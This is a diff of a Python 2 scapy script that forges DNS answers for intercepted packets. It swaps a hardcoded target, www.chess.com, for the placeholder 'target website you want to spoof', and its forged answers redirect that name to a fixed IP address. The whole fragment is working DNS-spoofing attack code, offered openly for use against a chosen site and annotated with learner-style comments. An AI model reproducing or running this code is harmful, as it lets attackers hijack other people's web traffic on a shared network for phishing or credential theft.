@@ -5,7 +5,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-	if "www.chess.com" in qname:
+	if "target website you want to spoof" in qname:
 		print "[+] Spoofing target"
 		answer = scapy.DNSRR(rrname=qname, rdata="108.174.11.49")#we change those two values 
 		scapy_packet[scapy.DNS].an =  answer  #at dns group get the an  field
